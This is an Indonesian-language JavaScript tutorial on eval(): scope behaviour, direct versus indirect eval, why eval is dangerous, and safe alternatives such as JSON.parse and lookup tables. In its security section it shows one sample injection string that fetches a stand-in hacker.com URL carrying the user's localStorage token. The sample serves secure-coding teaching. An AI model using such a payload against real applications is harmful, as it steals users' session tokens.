# 18 - Eval (Eksekusi Dinamis, Analisis Risiko Keamanan, dan Alternatif Aman)

> ⏱️ **TL;DR (Ringkasan Cepat):**
>
> - **Fungsi Utama**: Mengevaluasi string teks sebagai kode JavaScript dinamis pada saat _runtime_.
> - **Kapan Digunakan**: Hampir **tidak pernah** dalam kode aplikasi modern komersial; dijuluki _"eval is evil"_ karena membuka celah keamanan kritis (_Code Injection / XSS_) dan mematikan optimasi compiler mesin JavaScript (V8).
> - **Aturan Praktis**: Pegang teguh prinsip **"Never use eval()!"**; gunakan `JSON.parse()` untuk parsing data, pola _Lookup Table_ untuk kalkulator/perintah, dan `new Function()` hanya jika Anda sedang membangun compiler atau sandbox khusus.

---

## 1. 🎯 Tujuan Belajar

- Memahami mekanisme internal fungsi bawaan `eval()` dalam mengevaluasi string ekspresi dan _statement_.
- Mengetahui perbedaan perilaku scope pada **Sloppy Mode** vs **Strict Mode** (`"use strict"`).
- Membedakan antara **Direct `eval()`** (akses scope lokal) dan **Indirect `eval()`** seperti `(0, eval)()` (akses scope global).
- Menganalisis alasan fundamental mengapa `eval()` dilarang keras di industri: _Arbitrary Code Execution_, pembongkaran optimasi JIT Compiler (V8), dan kerusakan _mangling_ bundler.
- Menguasai alternatif modern yang aman: **`JSON.parse()`**, pola **Kamus Operasi (_Lookup Table_)**, dan konstruktor **`new Function()`**.

---

## 2. 📖 Penjelasan Konsep & API Reference

### 🎭 Analogi Dunia Nyata

> `eval()` seperti **memberikan kunci brankas master dan hak otorisasi mutlak kantor pusat kepada sembarang orang asing yang datang lewat loket kasir**: Anda mungkin hanya berharap orang tersebut menukar uang receh, namun karena Anda memberinya otoritas eksekusi tanpa batas, ia bisa mentransfer seluruh saldo brankas bank ke rekening pribadinya, mengubah data nasabah, atau membakar kantor Anda dari dalam.

---

### 1. Cheat-Sheet Perbandingan Metode Eksekusi Dinamis

| Fitur                            | `eval()` Direct             | `(0, eval)()` Indirect  | `new Function()`           | `JSON.parse()`               |
| :------------------------------- | :-------------------------- | :---------------------- | :------------------------- | :--------------------------- |
| **Akses Scope Lokal (Closure)**  | ✅ Penuh (Bisa baca & ubah) | ❌ Tidak (Hanya global) | ❌ Tidak (Hanya global)    | ❌ Tidak ada kode yang jalan |
| **Scope Variabel Baru (Sloppy)** | Bocor ke fungsi luar        | Bocor ke window/global  | Terisolasi di fungsi       | Hanya mengembalikan nilai    |
| **Dampak ke Optimasi JIT V8**    | 💥 Sangat Merusak           | 💥 Merusak              | ⚠️ Moderat                 | 🚀 Nol (Sangat Cepat)        |
| **Risiko Code Injection**        | 🔴 Ekstrem Tinggi           | 🔴 Ekstrem Tinggi       | 🔴 Tinggi                  | 🟢 Bebas Risiko (Aman 100%)  |
| **Rekomendasi Industri**         | ❌ DILARANG KERAS           | ❌ HINDARI              | ⚠️ Khusus Tooling/Compiler | ✅ **Sangat Dianjurkan**     |

---

### 2. Cara Kerja Dasar `eval()`

`eval(string)` menerima parameter berupa string dan mengeksekusinya di titik pemanggilan. Jika ekspresi menghasilkan nilai, `eval()` mengembalikan nilai evaluasi dari _statement_ terakhir:

```javascript
const a = 10;
const b = 20;

const hasil = eval("a + b * 2"); // Menghasilkan 50
console.log(hasil);
```

---

### 3. Pencemaran Scope: Sloppy Mode vs Strict Mode

Pada mode non-strict (_Sloppy Mode_), `eval()` memiliki kemampuan berbahaya untuk menyuntikkan variabel baru langsung ke dalam scope fungsi pemanggilnya:

```javascript
// A. Sloppy Mode (Variabel bocor keluar):
function demoSloppy() {
  eval("var disusupi = 100;");
  console.log(disusupi); // 100 (Variabel bocor ke fungsi lokal!)
}

// B. Strict Mode (Variabel terisolasi di dalam eval):
function demoStrict() {
  "use strict";
  eval("var terisolasi = 200;");
  // console.log(terisolasi); // ❌ ReferenceError: terisolasi is not defined
}
```

---

### 4. Direct Eval vs Indirect Eval

JavaScript membedakan pemanggilan `eval` menjadi dua kategori berdasarkan cara pemanggilannya:

1. **Direct `eval()`**: Dipanggil secara langsung dengan nama `eval(...)`.
   - Mengakses scope leksikal lokal tempat ia dipanggil.
2. **Indirect `eval()`**: Dipanggil melalui referensi variabel lain atau ekspresi operator koma `(0, eval)(...)`.
   - Hanya berjalan di **lingkup global** (`globalThis`), tidak dapat mengakses variabel lokal di fungsi sekitarnya:

```javascript
globalThis.pesan = "Pesan Global";

function tesScope() {
  const pesan = "Pesan Lokal";

  console.log(eval("pesan")); // "Pesan Lokal"  (Direct -> akses lokal)
  console.log((0, eval)("pesan")); // "Pesan Global" (Indirect -> dipaksa global)
}
```

---

### 5. Mengapa "Eval is Evil": Tiga Alasan Kritis

1. **Celah Keamanan Fatal (_Arbitrary Code Injection_)**:
   Jika string yang dievaluasi berasal dari input form, query parameter, atau payload API, pengguna jahat dapat menyuntikkan script arbitrary:
   ```javascript
   // Input jahat dari form:
   const input =
     "1; fetch('https://hacker.com/steal?token=' + localStorage.getItem('token'))";
   eval(input); // ❌ Token pengguna tercuri!
   ```
2. **Menghancurkan Optimasi Kompiler (JIT De-optimization)**:
   Engine modern seperti V8 mengoptimalkan kode dengan menganalisis posisi variabel di memori sebelum kode berjalan. Karena `eval()` berpotensi mengubah atau menyuntikkan variabel baru secara dinamis, V8 terpaksa **mematikan optimasi mesin** pada scope tersebut, membuat performa aplikasi anjlok.
3. **Macet pada Minifikasi Kode (_Build Bundler_)**:
   Alat kompresi kode seperti Terser atau esbuild tidak dapat melakukan _variable mangling_ (mengubah nama variabel panjang menjadi 1 huruf) di sekitar `eval()` karena takut merusak string yang dievaluasi.

---

### 6. Alternatif Aman 1: `JSON.parse()` untuk Data

Pada era JavaScript awal (sebelum 2009), programmer sering menggunakan `eval('(' + jsonStr + ')')` untuk membaca objek data JSON. Pola ini sekarang dilarang keras! Selalu gunakan standar bawaan `JSON.parse()`:

```javascript
const jsonString = '{"user": "joko", "role": "admin"}';

// ❌ BAHAYA: eval('(' + jsonString + ')');
// ✅ AMAN 100%:
const data = JSON.parse(jsonString);
console.log(data.user); // "joko"
```

---

### 7. Alternatif Aman 2: Kamus Operasi (_Lookup Table_)

Jika tujuan Anda menggunakan `eval()` adalah untuk membuat kalkulator atau mengevaluasi formula matematika dinamis berdasarkan operator:

```javascript
// Petakan operator ke dalam kamus fungsi aman (Strategy Pattern):
const kalkulator = {
  "+": (a, b) => a + b,
  "-": (a, b) => a - b,
  "*": (a, b) => a * b,
  "/": (a, b) => (b !== 0 ? a / b : "Division by zero"),
};

function hitung(a, b, op) {
  const aksi = kalkulator[op];
  if (!aksi) throw new Error(`Operator '${op}' tidak diizinkan!`);
  return aksi(a, b);
}

console.log(hitung(10, 5, "*")); // 50 ✅ Aman tanpa celah injeksi kode
```

---

### 8. Alternatif Aman 3: `new Function()` untuk Kompilasi Dinamis

Jika Anda benar-benar membangun sistem kompilator template (seperti Handlebars atau internal bundler) yang wajib menghasilkan kode fungsi saat runtime:

```javascript
// new Function() hanya berjalan di lingkup global dan tidak mengikat closure lokal:
const rumus = new Function("alas", "tinggi", "return 0.5 * alas * tinggi;");

console.log(rumus(10, 8)); // 40
```

> ⚠️ **Catatan Penting**:
> Walaupun lebih baik daripada `eval()` karena tidak membocorkan scope lokal, `new Function()` **tetap memicu peringatan Content Security Policy (CSP)** di browser produksi jika kebijakan `unsafe-eval` dinonaktifkan.

---

## 3. 💻 Kode Praktik Terpadu (`example.js`)

Seluruh konsep cara kerja `eval()`, jebakan scope di Sloppy vs Strict mode, perbedaan Direct vs Indirect eval, simulasi eksploitasi Code Injection, serta tiga alternatif implementasi yang aman dirangkum ke dalam satu laboratorium kode siap pakai:

📁 File: [`example.js`](./example.js)

```bash
# Jalankan langsung dari terminal:
node 03-standard-library/18-eval/example.js
```

---

## 4. 💡 Panduan Praktis & Studi Kasus

### 🏢 Real-World Use Case

1. **REPL & Online Code Playground (DevTools / CodePen)**:
   Aplikasi yang memang bertujuan mengeksekusi kode dari pengguna. Namun, di lingkungan produksi nyata, kode tersebut **dijalankan di Web Worker atau sandbox terisolasi tanpa akses ke DOM atau cookie utama**.
2. **Mesin Template & Parser Formula Spreadsheet**:
   Sebagian besar library formula spreadsheet modern menggunakan **AST (Abstract Syntax Tree) Parser** murni alih-alih `eval()`.

### ⚠️ Common Pitfalls (Jebakan Umum)

- **Mengevaluasi Parameter URL atau Form Pengguna**:
  Kesalahan paling fatal yang menyebabkan kerentanan keamanan XSS tingkat tinggi.
- **Menggunakan `eval` untuk Membaca Properti Dinamis**:
  Pemula sering menulis `eval('obj.' + prop)`. Padahal JavaScript sudah menyediakan notasi kurung siku yang aman: `obj[prop]`.
- **Aplikasi Crash di Lingkungan CSP Ketat**:
  Aplikasi enterprise yang mematuhi standar OWASP memblokir `'unsafe-eval'` pada header HTTP CSP. Kode yang memuat `eval()` akan langsung dilempar error oleh browser.

### 🌟 Best Practice

- **Pegang aturan utama**: 99.9% kebutuhan pemrograman aplikasi web modern tidak memerlukan `eval()`.
- Gunakan `JSON.parse()` untuk membaca format data teks.
- Gunakan _Lookup Table / Strategy Pattern_ untuk kalkulator dan pemrosesan instruksi pengguna.
- Gunakan parser berbasis AST (_Abstract Syntax Tree_) jika membutuhkan kalkulasi ekspresi matematika yang kompleks.

---

## 5. ✍️ Latihan Mandiri

1. Buatlah fungsi `kalkulatorStringAman(angka1, operator, angka2)` yang mendukung operator `+`, `-`, `*`, `/`, dan `**` menggunakan teknik _Lookup Table_ tanpa menggunakan `eval()`.
2. Jelaskan mengapa kode `JSON.parse('{"status": "ok"}')` 100% aman dari eksekusi kode berbahaya sedangkan `eval('({"status": "ok"})')` berisiko tinggi.

---

## 6. 🧭 Navigasi

- ⬅️ **Sebelumnya:** [17 - Base64](../17-base64/README.md)
- ➡️ **Modul Selanjutnya:** [01 - Tanpa Module (Modul 04)](../../04-modules/01-without-module/README.md)
- 🏠 **Daftar Isi Modul 03:** [README Modul 03](../README.md)
- 📑 **Daftar Isi Utama:** [Kembali ke Root README](../../README.md)
